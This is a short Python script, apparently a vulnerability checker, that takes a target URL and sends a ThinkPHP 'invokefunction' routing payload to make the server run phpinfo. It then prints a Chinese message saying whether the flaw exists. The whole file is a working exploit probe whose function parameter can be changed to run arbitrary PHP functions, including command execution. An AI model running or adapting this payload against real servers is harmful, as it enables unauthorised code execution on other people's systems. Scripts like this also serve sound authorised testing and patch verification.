import requests
import sys

url = sys.argv[1]
getPara = {"s" : "index/\\think\\app/invokefunction", 
            "function" : "phpinfo", "vars[0]" : "1"}
res = requests.get(url = url, params = getPara)

if res.status_code == 200 and "Configure" in res.text :
    print("漏洞存在~")
else :
    print("什么也没有~")